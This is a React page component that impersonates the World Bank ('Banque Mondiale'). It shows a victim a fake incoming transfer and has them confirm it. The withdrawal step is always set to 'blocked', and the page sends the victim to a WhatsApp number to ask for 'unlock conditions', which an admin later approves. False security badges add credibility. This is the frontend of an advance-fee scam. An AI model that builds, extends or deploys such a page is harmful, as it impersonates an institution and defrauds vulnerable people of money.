import { useParams, Link } from "wouter";
import { CheckCircle2, ShieldCheck, ShieldAlert, AlertCircle, Clock, User, Users, CreditCard, Smartphone, Wallet, Lock, MessageCircle, Unlock, Building2, Hash } from "lucide-react";
import { format } from "date-fns";
import { fr } from "date-fns/locale";
import { useEffect, useState } from "react";
import { convertFromEur, formatCurrencyAmount, CURRENCY_SYMBOLS } from "@/lib/currency";

type TransferData = {
  id: number;
  token: string;
  reference: string;
  beneficiaryName: string;
  amount: number;
  currency: string;
  displayCurrency: string;
  message: string | null;
  status: string;
  expiresAt: string | null;
  createdAt: string;
  confirmedAt: string | null;
  senderName: string | null;
  senderFirstName: string | null;
  senderLastName: string | null;
  senderCountry: string | null;
  senderCity: string | null;
  receiverFirstName: string | null;
  receiverLastName: string | null;
  receiverEmail: string | null;
  receiverCountry: string | null;
  receiverCity: string | null;
  receiverAccountNumber: string | null;
  receiverBankId: string | null;
  receiverBankLabel: string | null;
  paymentMethods: string | null;
  paymentMethodLabels: string | null;
  blockReason: string | null;
  whatsappNumber: string | null;
  adminUnlocked: boolean;
  adminUnlockedAt: string | null;
};

type WithdrawalStage = "initial" | "blocked" | "contacted" | "unlocked";

const PAYMENT_METHOD_META: Record<string, { label: string; icon: React.ElementType; color: string; bg: string }> = {
  card: { label: "Carte bancaire", icon: CreditCard, color: "#003087", bg: "#dbeafe" },
  paypal: { label: "PayPal", icon: Wallet, color: "#0070BA", bg: "#dbeafe" },
  mobile_money: { label: "Mobile Money", icon: Smartphone, color: "#1DB954", bg: "#dcfce7" },
};

const STEPS = [
  { key: "sent", label: "Envoyé" },
  { key: "received", label: "Réception" },
  { key: "withdraw", label: "Retrait" },
  { key: "confirmed", label: "Confirmé" },
];

function getActiveStep(status: string, stage: WithdrawalStage) {
  if (status === "completed" && stage === "unlocked") return 4;
  if (status === "completed") return 3;
  if (status === "expired" || status === "cancelled") return 0;
  return 1;
}

function StatusBar({ status, stage }: { status: string; stage: WithdrawalStage }) {
  const activeStep = getActiveStep(status, stage);
  const isFullyDone = status === "completed" && stage === "unlocked";
  const activeColor = isFullyDone ? "#16a34a" : "#003087";

  return (
    <div className="flex items-center w-full">
      {STEPS.map((step, i) => {
        const stepNum = i + 1;
        const done = stepNum <= activeStep;
        const isCurrent = !done && stepNum === activeStep + 1 && status !== "expired" && status !== "cancelled";

        return (
          <div key={step.key} className="flex items-center flex-1 last:flex-none">
            <div className="flex flex-col items-center gap-1.5 shrink-0">
              <div
                className="h-9 w-9 rounded-full flex items-center justify-center border-2 transition-all duration-500"
                style={{
                  backgroundColor: done ? activeColor : "#ffffff",
                  borderColor: done ? activeColor : isCurrent ? activeColor : "#d1d5db",
                  boxShadow: isCurrent ? `0 0 0 4px #bfdbfe` : "none",
                }}
              >
                {done ? (
                  <CheckCircle2 className="h-5 w-5 text-white" />
                ) : (
                  <span className="text-xs font-bold" style={{ color: isCurrent ? activeColor : "#9ca3af" }}>
                    {stepNum}
                  </span>
                )}
              </div>
              <span className="text-[11px] font-semibold whitespace-nowrap" style={{ color: done ? activeColor : isCurrent ? activeColor : "#6b7280" }}>
                {step.label}
              </span>
              {isCurrent && stepNum === 2 && (
                <span className="text-[9px] font-bold uppercase tracking-wider text-amber-500 -mt-0.5">En attente</span>
              )}
            </div>
            {i < STEPS.length - 1 && (
              <div className="flex-1 mx-1 h-[3px] rounded-full overflow-hidden bg-gray-200 mb-5">
                <div className="h-full rounded-full transition-all duration-700"
                  style={{ width: stepNum <= activeStep ? "100%" : "0%", backgroundColor: activeColor }} />
              </div>
            )}
          </div>
        );
      })}
    </div>
  );
}

function InfoCard({ icon: Icon, title, rows, color = "#003087" }: {
  icon: React.ElementType;
  title: string;
  rows: { label: string; value: string | null }[];
  color?: string;
}) {
  const filteredRows = rows.filter((r) => r.value);
  if (filteredRows.length === 0) return null;
  return (
    <div className="w-full bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
      <div className="flex items-center gap-2.5 px-5 py-3.5 border-b border-gray-100" style={{ backgroundColor: color + "08" }}>
        <div className="h-8 w-8 rounded-lg flex items-center justify-center" style={{ backgroundColor: color + "15" }}>
          <Icon className="h-4 w-4" style={{ color }} />
        </div>
        <p className="text-xs font-bold uppercase tracking-[0.15em] text-gray-600">{title}</p>
      </div>
      <div className="px-5 py-1">
        {filteredRows.map((row) => (
          <div key={row.label} className="flex justify-between items-center py-3 border-b border-gray-50 last:border-0">
            <span className="text-xs text-gray-500 font-medium">{row.label}</span>
            <span className="text-xs font-semibold text-gray-900 text-right max-w-[60%]">{row.value}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

export default function TransferLink() {
  const params = useParams();
  const token = params.token as string;
  const [transfer, setTransfer] = useState<TransferData | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(false);
  const [confirming, setConfirming] = useState(false);
  const [accepted, setAccepted] = useState(false);
  const [withdrawalStage, setWithdrawalStage] = useState<WithdrawalStage>("initial");

  // Persist withdrawal stage in localStorage
  useEffect(() => {
    if (!token) return;
    const saved = localStorage.getItem(`withdrawal_stage_${token}`) as WithdrawalStage | null;
    if (saved) setWithdrawalStage(saved);
  }, [token]);

  const setStage = (stage: WithdrawalStage) => {
    setWithdrawalStage(stage);
    localStorage.setItem(`withdrawal_stage_${token}`, stage);
  };

  // Initial load
  useEffect(() => {
    if (!token) return;
    fetch(`/api/transfers/link/${token}`)
      .then((r) => {
        if (!r.ok) throw new Error("Not found");
        return r.json();
      })
      .then((data) => { setTransfer(data); setLoading(false); })
      .catch(() => { setError(true); setLoading(false); });
  }, [token]);

  // Poll server every 6 seconds when waiting for admin unlock
  useEffect(() => {
    if (!token) return;
    if (withdrawalStage !== "contacted") return;
    if (transfer?.adminUnlocked) return;

    const interval = setInterval(() => {
      fetch(`/api/transfers/link/${token}`)
        .then((r) => r.ok ? r.json() : null)
        .then((data) => {
          if (data) setTransfer(data);
        })
        .catch(() => {});
    }, 6000);

    return () => clearInterval(interval);
  }, [token, withdrawalStage, transfer?.adminUnlocked]);

  const handleConfirm = async () => {
    if (!token) return;
    setConfirming(true);
    try {
      const r = await fetch(`/api/transfers/link/${token}/confirm`, { method: "POST" });
      if (!r.ok) throw new Error("Error");
      const data = await r.json();
      setTransfer(data);
    } catch {
    } finally {
      setConfirming(false);
    }
  };

  const handleContactWhatsApp = () => {
    if (!transfer) return;
    const displayAmt = transfer.displayCurrency && transfer.displayCurrency !== "EUR"
      ? formatCurrencyAmount(convertFromEur(transfer.amount, transfer.displayCurrency), transfer.displayCurrency)
      : `${transfer.amount.toLocaleString("fr-FR", { minimumFractionDigits: 2 })} EUR`;

    const senderFullName = [transfer.senderFirstName, transfer.senderLastName].filter(Boolean).join(" ") || transfer.senderName || "N/A";
    const receiverFullName = [transfer.receiverFirstName, transfer.receiverLastName].filter(Boolean).join(" ") || transfer.beneficiaryName || "N/A";
    const dateStr = format(new Date(transfer.createdAt), "dd/MM/yyyy à HH:mm", { locale: fr });

    const msg = [
      `Bonjour, je vous contacte au sujet de mon virement Banque Mondiale.`,
      ``,
      `📋 *Détails de la transaction :*`,
      `• Référence : ${transfer.reference}`,
      `• Montant : ${displayAmt} (${transfer.amount.toLocaleString("fr-FR", { minimumFractionDigits: 2 })} EUR)`,
      `• Expéditeur : ${senderFullName}`,
      `• Receveur : ${receiverFullName}`,
      `• Date : ${dateStr}`,
      `• Statut : Réception confirmée`,
      ``,
      `Veuillez me fournir les conditions de déblocage de fonds.`,
    ].join("\n");

    const number = (transfer.whatsappNumber ?? "").replace(/\s+/g, "").replace(/^\+/, "");
    const url = `https://wa.me/${number}?text=${encodeURIComponent(msg)}`;
    window.open(url, "_blank");
    setStage("contacted");
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center" style={{ background: "#f0f4f8" }}>
        <div className="flex flex-col items-center gap-3">
          <div className="h-9 w-9 border-[3px] border-[#003087] border-t-transparent rounded-full animate-spin" />
          <p className="text-sm text-gray-500 font-medium">Chargement du virement…</p>
        </div>
      </div>
    );
  }

  if (error || !transfer) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4" style={{ background: "#f0f4f8" }}>
        <div className="w-full max-w-sm text-center bg-white rounded-2xl shadow-lg p-8">
          <div className="h-16 w-16 rounded-full bg-red-100 flex items-center justify-center mx-auto mb-4">
            <ShieldAlert className="h-8 w-8 text-red-500" />
          </div>
          <h2 className="text-xl font-bold text-gray-900 mb-2">Lien invalide ou expiré</h2>
          <p className="text-gray-500 text-sm mb-6">Ce virement n'est plus accessible ou n'existe pas.</p>
          <Link href="/">
            <button className="w-full h-11 rounded-xl border border-gray-200 text-sm font-medium text-gray-700 hover:bg-gray-50 transition-colors">
              Retourner à l'accueil
            </button>
          </Link>
        </div>
      </div>
    );
  }

  const isCompleted = transfer.status === "completed";
  const isExpired = transfer.status === "expired";
  const isCancelled = transfer.status === "cancelled";
  const isPending = !isCompleted && !isExpired && !isCancelled;

  const senderFullName = [transfer.senderFirstName, transfer.senderLastName].filter(Boolean).join(" ") || transfer.senderName || null;
  const receiverFullName = [transfer.receiverFirstName, transfer.receiverLastName].filter(Boolean).join(" ") || transfer.beneficiaryName;

  // Parsed payment methods
  let parsedMethods: string[] = [];
  try {
    if (transfer.paymentMethods) parsedMethods = JSON.parse(transfer.paymentMethods);
  } catch {}

  let parsedMethodLabels: string[] = [];
  try {
    if (transfer.paymentMethodLabels) parsedMethodLabels = JSON.parse(transfer.paymentMethodLabels);
  } catch {}

  // Converted amount
  const displayCurrency = transfer.displayCurrency || "EUR";
  const convertedAmount = displayCurrency !== "EUR"
    ? convertFromEur(transfer.amount, displayCurrency)
    : null;

  const currSymbol = CURRENCY_SYMBOLS[displayCurrency] ?? displayCurrency;

  return (
    <div className="min-h-screen flex flex-col" style={{ background: "#f0f4f8" }}>

      {/* Header */}
      <header className="bg-[#003087] shadow-lg">
        <div className="max-w-xl mx-auto px-5 h-16 flex items-center gap-3">
          <img src="/logo-banque-mondiale.png" alt="Banque Mondiale"
            className="h-10 w-10 rounded-xl object-contain bg-white p-1 shadow" />
          <div>
            <p className="text-white font-black text-sm tracking-widest uppercase leading-tight">Banque Mondiale</p>
            <p className="text-white/55 text-[10px] tracking-wide font-medium">Transaction sécurisée · SSL 256-bit</p>
          </div>
          <div className="ml-auto flex items-center gap-1.5 bg-white/10 rounded-full px-3 py-1">
            <ShieldCheck className="h-3.5 w-3.5 text-green-400" />
            <span className="text-[10px] text-green-300 font-semibold">Sécurisé</span>
          </div>
        </div>
      </header>

      <main className="flex-1 flex flex-col items-center px-4 py-6 gap-4 max-w-xl mx-auto w-full">

        {/* Hero card — Amount */}
        <div className="w-full rounded-2xl overflow-hidden shadow-xl" style={{ background: "linear-gradient(135deg, #003087 0%, #0050c8 100%)" }}>
          <div className="px-6 pt-7 pb-4 text-center">
            <p className="text-white/60 text-[11px] font-bold uppercase tracking-[0.2em] mb-3">Montant du virement</p>

            {/* Display currency amount (primary) */}
            {convertedAmount !== null ? (
              <>
                <p className="text-5xl font-black text-white leading-none">
                  {convertedAmount.toLocaleString("fr-FR", { minimumFractionDigits: ["XOF","XAF","GNF","JPY"].includes(displayCurrency) ? 0 : 2, maximumFractionDigits: ["XOF","XAF","GNF","JPY"].includes(displayCurrency) ? 0 : 2 })}
                  <span className="text-2xl font-bold text-white/70 ml-2">{currSymbol}</span>
                </p>
                <p className="text-white/50 text-xs mt-1.5">
                  ({transfer.amount.toLocaleString("fr-FR", { minimumFractionDigits: 2 })} EUR)
                </p>
              </>
            ) : (
              <p className="text-5xl font-black text-white leading-none">
                {transfer.amount.toLocaleString("fr-FR", { minimumFractionDigits: 2 })}
                <span className="text-2xl font-bold text-white/70 ml-2">€</span>
              </p>
            )}
          </div>

          {/* Status bar */}
          <div className="mx-4 mb-5 bg-white rounded-xl px-5 py-5 shadow-inner">
            <StatusBar status={transfer.status} stage={withdrawalStage} />
          </div>
        </div>

        {/* Global status pill */}
        <div className="flex justify-center">
          {isCompleted ? (
            <div className="flex items-center gap-2 bg-green-50 border border-green-200 rounded-full px-5 py-2 shadow-sm">
              <CheckCircle2 className="h-4 w-4 text-green-600" />
              <span className="text-green-700 text-sm font-bold">Réception confirmée</span>
            </div>
          ) : isExpired || isCancelled ? (
            <div className="flex items-center gap-2 bg-red-50 border border-red-200 rounded-full px-5 py-2 shadow-sm">
              <AlertCircle className="h-4 w-4 text-red-500" />
              <span className="text-red-600 text-sm font-bold">{isExpired ? "Virement expiré" : "Virement annulé"}</span>
            </div>
          ) : (
            <div className="flex items-center gap-2 bg-amber-50 border border-amber-200 rounded-full px-5 py-2 shadow-sm">
              <Clock className="h-4 w-4 text-amber-500" />
              <span className="text-amber-700 text-sm font-bold">En attente de confirmation</span>
            </div>
          )}
        </div>

        {/* Sender info */}
        <InfoCard
          icon={User}
          title="Informations de l'expéditeur"
          color="#003087"
          rows={[
            { label: "Nom complet", value: senderFullName },
            { label: "Pays", value: transfer.senderCountry },
            { label: "Ville", value: transfer.senderCity },
          ]}
        />

        {/* Receiver info */}
        <InfoCard
          icon={Users}
          title="Informations du receveur"
          color="#7c3aed"
          rows={[
            { label: "Nom complet", value: receiverFullName },
            { label: "Email", value: transfer.receiverEmail },
            { label: "Pays", value: transfer.receiverCountry },
            { label: "Ville", value: transfer.receiverCity },
          ]}
        />

        {/* Receiver account number / RIB + Bank */}
        {(transfer.receiverAccountNumber || transfer.receiverBankLabel) && (
          <div className="w-full bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
            <div className="flex items-center gap-2.5 px-5 py-3.5 border-b border-gray-100" style={{ backgroundColor: "#7c3aed08" }}>
              <div className="h-8 w-8 rounded-lg flex items-center justify-center" style={{ backgroundColor: "#7c3aed15" }}>
                <Building2 className="h-4 w-4" style={{ color: "#7c3aed" }} />
              </div>
              <p className="text-xs font-bold uppercase tracking-[0.15em] text-gray-600">Coordonnées bancaires du receveur</p>
            </div>
            <div className="px-5 py-4 space-y-4">
              {/* Bank row */}
              {transfer.receiverBankLabel && (
                <div className="flex items-center gap-3 p-3 rounded-xl" style={{ backgroundColor: "#7c3aed08", border: "1px solid #7c3aed20" }}>
                  <div
                    className="h-10 w-10 rounded-xl flex items-center justify-center font-black text-white text-xs shrink-0"
                    style={{ backgroundColor: "#7c3aed" }}
                  >
                    {transfer.receiverBankLabel.slice(0, 2).toUpperCase()}
                  </div>
                  <div className="min-w-0">
                    <p className="text-[10px] font-bold uppercase tracking-wider text-gray-400 mb-0.5">Banque</p>
                    <p className="text-sm font-bold text-gray-900 truncate">{transfer.receiverBankLabel}</p>
                  </div>
                </div>
              )}
              {/* Account number row */}
              {transfer.receiverAccountNumber && (
                <div>
                  <p className="text-[10px] font-bold uppercase tracking-wider text-gray-400 mb-1.5 flex items-center gap-1.5">
                    <Hash className="h-3 w-3" />
                    Numéro de compte / RIB
                  </p>
                  <p className="font-mono text-sm font-semibold text-gray-900 break-all tracking-wide select-all bg-gray-50 rounded-xl px-4 py-3 border border-gray-100">
                    {transfer.receiverAccountNumber}
                  </p>
                </div>
              )}
            </div>
          </div>
        )}

        {/* Payment methods */}
        {(parsedMethods.length > 0 || parsedMethodLabels.length > 0) && (
          <div className="w-full bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
            <div className="flex items-center gap-2.5 px-5 py-3.5 border-b border-gray-100 bg-gray-50/80">
              <div className="h-8 w-8 rounded-lg flex items-center justify-center bg-amber-100">
                <Building2 className="h-4 w-4 text-amber-600" />
              </div>
              <p className="text-xs font-bold uppercase tracking-[0.15em] text-gray-600">Moyens de paiement acceptés</p>
            </div>
            <div className="px-5 py-3 flex flex-wrap gap-2">
              {/* Use labels if available, otherwise fall back to ID-based meta */}
              {parsedMethodLabels.length > 0
                ? parsedMethodLabels.map((label, i) => (
                    <div key={i} className="flex items-center gap-2 px-4 py-2 rounded-xl border border-amber-200 bg-amber-50">
                      <Building2 className="h-4 w-4 text-amber-600 shrink-0" />
                      <span className="text-xs font-semibold text-amber-800">{label}</span>
                    </div>
                  ))
                : parsedMethods.map((method) => {
                    const meta = PAYMENT_METHOD_META[method];
                    if (!meta) {
                      return (
                        <div key={method} className="flex items-center gap-2 px-4 py-2 rounded-xl border border-amber-200 bg-amber-50">
                          <CreditCard className="h-4 w-4 text-amber-600" />
                          <span className="text-xs font-semibold text-amber-800">{method}</span>
                        </div>
                      );
                    }
                    const Icon = meta.icon;
                    return (
                      <div key={method} className="flex items-center gap-2 px-4 py-2 rounded-xl border"
                        style={{ borderColor: meta.color + "40", backgroundColor: meta.bg }}>
                        <Icon className="h-4 w-4" style={{ color: meta.color }} />
                        <span className="text-xs font-semibold" style={{ color: meta.color }}>{meta.label}</span>
                      </div>
                    );
                  })
              }
            </div>
          </div>
        )}

        {/* Transaction details */}
        <div className="w-full bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
          <div className="flex items-center gap-2.5 px-5 py-3.5 border-b border-gray-100 bg-gray-50/80">
            <p className="text-xs font-bold uppercase tracking-[0.15em] text-gray-600">Détails de la transaction</p>
          </div>
          <div className="px-5 py-1">
            {[
              { label: "Référence", value: transfer.reference, mono: true },
              { label: "Date d'émission", value: format(new Date(transfer.createdAt), "dd MMMM yyyy, HH:mm", { locale: fr }) },
              ...(transfer.expiresAt ? [{ label: "Expire le", value: format(new Date(transfer.expiresAt), "dd MMMM yyyy", { locale: fr }) }] : []),
              ...(isCompleted && transfer.confirmedAt ? [{ label: "Confirmé le", value: format(new Date(transfer.confirmedAt), "dd MMMM yyyy, HH:mm", { locale: fr }) }] : []),
            ].map((row) => (
              <div key={row.label} className="flex justify-between items-center py-3 border-b border-gray-50 last:border-0">
                <span className="text-xs text-gray-500 font-medium">{row.label}</span>
                <span className={`text-xs font-semibold text-gray-900 text-right max-w-[55%] ${(row as any).mono ? "font-mono text-[11px] break-all" : ""}`}>
                  {row.value}
                </span>
              </div>
            ))}
          </div>
        </div>

        {/* Message */}
        {transfer.message && (
          <div className="w-full bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
            <div className="px-5 py-4">
              <p className="text-[10px] font-bold uppercase tracking-[0.15em] text-gray-400 mb-2">Message de l'expéditeur</p>
              <div className="bg-gray-50 rounded-xl px-4 py-3 border border-gray-100">
                <p className="text-sm text-gray-700 italic leading-relaxed">"{transfer.message}"</p>
              </div>
            </div>
          </div>
        )}

        {/* ────────── PENDING: acceptance + confirm ────────── */}
        {isPending && (
          <div className="w-full space-y-3">
            {/* Acceptance checkbox */}
            <div className="w-full bg-white rounded-2xl shadow-sm border border-gray-100 px-5 py-4">
              <label className="flex items-start gap-3 cursor-pointer">
                <input
                  type="checkbox"
                  className="mt-0.5 h-4 w-4 accent-[#003087] shrink-0"
                  checked={accepted}
                  onChange={(e) => setAccepted(e.target.checked)}
                />
                <span className="text-sm text-gray-700 leading-relaxed">
                  Je confirme que les informations inscrites pour le receveur sont{" "}
                  <strong>correctes et me correspondent bien</strong>. Je reconnais être le destinataire légitime de ce virement.
                </span>
              </label>
            </div>

            <button
              onClick={handleConfirm}
              disabled={confirming || !accepted}
              className="w-full h-14 rounded-2xl text-white font-bold text-base shadow-lg transition-all active:scale-[0.98] disabled:opacity-50 flex items-center justify-center gap-2"
              style={{ background: accepted ? "linear-gradient(135deg, #003087 0%, #0050c8 100%)" : "#9ca3af", cursor: accepted ? "pointer" : "not-allowed" }}
            >
              {confirming ? (
                <>
                  <div className="h-5 w-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  Confirmation en cours…
                </>
              ) : (
                <>
                  <CheckCircle2 className="h-5 w-5" />
                  Confirmer la réception
                </>
              )}
            </button>
          </div>
        )}

        {/* ────────── COMPLETED: withdrawal flow ────────── */}
        {isCompleted && (
          <div className="w-full space-y-3">

            {/* Stage: initial — show Retrait button */}
            {withdrawalStage === "initial" && (
              <button
                onClick={() => setStage("blocked")}
                className="w-full h-14 rounded-2xl font-bold text-base shadow-lg transition-all active:scale-[0.98] flex items-center justify-center gap-2 text-white"
                style={{ background: "linear-gradient(135deg, #059669 0%, #10b981 100%)" }}
              >
                <Wallet className="h-5 w-5" />
                Effectuer le retrait
              </button>
            )}

            {/* Stage: blocked — show blocked message + contact button */}
            {(withdrawalStage === "blocked" || withdrawalStage === "contacted" || withdrawalStage === "unlocked") && (
              <div className="w-full bg-red-50 border-2 border-red-200 rounded-2xl overflow-hidden">
                <div className="flex items-center gap-3 px-5 py-3.5 bg-red-100/60 border-b border-red-200">
                  <div className="h-9 w-9 rounded-full bg-red-200 flex items-center justify-center shrink-0">
                    <Lock className="h-5 w-5 text-red-700" />
                  </div>
                  <div>
                    <p className="text-sm font-bold text-red-800">Retrait bloqué</p>
                    <p className="text-xs text-red-600">Votre retrait est temporairement bloqué</p>
                  </div>
                </div>
                {transfer.blockReason && (
                  <div className="px-5 py-4">
                    <p className="text-[10px] font-bold uppercase tracking-wider text-red-400 mb-2">Raison</p>
                    <p className="text-sm text-red-800 leading-relaxed">{transfer.blockReason}</p>
                  </div>
                )}
              </div>
            )}

            {/* Contact button */}
            {withdrawalStage === "blocked" && (
              <button
                onClick={handleContactWhatsApp}
                className="w-full h-14 rounded-2xl font-bold text-base shadow-lg transition-all active:scale-[0.98] flex items-center justify-center gap-2 text-white"
                style={{ background: "linear-gradient(135deg, #25D366 0%, #128C7E 100%)" }}
              >
                <MessageCircle className="h-5 w-5" />
                Contacter le service Banque Mondiale
              </button>
            )}

            {/* After contact: waiting for admin or unlocked */}
            {(withdrawalStage === "contacted" || withdrawalStage === "unlocked") && (
              <div className="w-full space-y-3">

                {/* Waiting for admin confirmation */}
                {!transfer?.adminUnlocked && (
                  <>
                    <div className="w-full bg-amber-50 border border-amber-200 rounded-xl px-4 py-4 flex items-start gap-3">
                      <div className="h-8 w-8 rounded-full bg-amber-100 flex items-center justify-center shrink-0 mt-0.5">
                        <div className="h-4 w-4 border-2 border-amber-500 border-t-transparent rounded-full animate-spin" />
                      </div>
                      <div>
                        <p className="text-sm font-bold text-amber-800">En attente de confirmation admin</p>
                        <p className="text-xs text-amber-600 mt-1 leading-relaxed">
                          Votre demande a été transmise. Un conseiller Banque Mondiale va examiner votre dossier et confirmer le déblocage de vos fonds. Nous vérifions automatiquement toutes les 6 secondes.
                        </p>
                      </div>
                    </div>

                    <button
                      onClick={() => handleContactWhatsApp()}
                      className="w-full h-12 rounded-2xl font-semibold text-sm border-2 transition-all active:scale-[0.98] flex items-center justify-center gap-2"
                      style={{ borderColor: "#25D366", color: "#128C7E", backgroundColor: "#f0fdf4" }}
                    >
                      <MessageCircle className="h-4 w-4" />
                      Recontacter le service
                    </button>

                    <button
                      disabled
                      className="w-full h-14 rounded-2xl font-bold text-base flex items-center justify-center gap-2 text-slate-400 bg-slate-100 border-2 border-slate-200 cursor-not-allowed"
                    >
                      <Lock className="h-5 w-5" />
                      Déblocage en attente de validation admin
                    </button>
                  </>
                )}

                {/* Admin has unlocked — show Débloquer button */}
                {transfer?.adminUnlocked && (
                  <>
                    <div className="w-full bg-emerald-50 border border-emerald-200 rounded-xl px-4 py-4 flex items-start gap-3">
                      <div className="h-8 w-8 rounded-full bg-emerald-100 flex items-center justify-center shrink-0 mt-0.5">
                        <CheckCircle2 className="h-4 w-4 text-emerald-600" />
                      </div>
                      <div>
                        <p className="text-sm font-bold text-emerald-800">Déblocage confirmé par l'administration</p>
                        <p className="text-xs text-emerald-600 mt-1">
                          Votre dossier a été validé. Vous pouvez maintenant finaliser le retrait de vos fonds.
                        </p>
                      </div>
                    </div>

                    <button
                      onClick={() => setStage("unlocked")}
                      className="w-full h-14 rounded-2xl font-bold text-base shadow-lg transition-all active:scale-[0.98] flex items-center justify-center gap-2 text-white"
                      style={{ background: "linear-gradient(135deg, #003087 0%, #0050c8 100%)" }}
                    >
                      <Unlock className="h-5 w-5" />
                      Débloquer et retirer mes fonds
                    </button>
                  </>
                )}
              </div>
            )}
          </div>
        )}

        {/* Expired/Cancelled state */}
        {(isExpired || isCancelled) && (
          <div className="w-full h-14 rounded-2xl bg-gray-100 border-2 border-gray-200 flex items-center justify-center gap-2">
            <AlertCircle className="h-5 w-5 text-gray-400" />
            <span className="text-gray-500 font-bold text-base">{isExpired ? "Virement expiré" : "Virement annulé"}</span>
          </div>
        )}

        {/* Security badge */}
        <div className="w-full bg-white rounded-2xl border border-gray-100 shadow-sm px-5 py-4 flex items-center gap-4">
          <div className="h-12 w-12 rounded-full bg-blue-50 flex items-center justify-center shrink-0">
            <ShieldCheck className="h-6 w-6 text-[#003087]" />
          </div>
          <div>
            <p className="text-sm font-bold text-gray-900">Transaction 100% sécurisée</p>
            <p className="text-xs text-gray-500 mt-0.5 leading-relaxed">
              Vos données sont chiffrées et protégées par la Banque Mondiale. Aucune information bancaire n'est partagée.
            </p>
          </div>
        </div>

        <div className="flex justify-center pb-2">
          <a
            href="/"
            className="inline-flex items-center gap-2 px-5 py-2.5 rounded-full bg-[#003087] text-white text-sm font-semibold shadow hover:bg-[#002070] transition-colors"
          >
            Découvrir Banque Mondiale
          </a>
        </div>

        <p className="text-center text-xs text-gray-400 pb-2">
          © {new Date().getFullYear()} La Banque Mondiale · Tous droits réservés
        </p>
      </main>
    </div>
  );
}
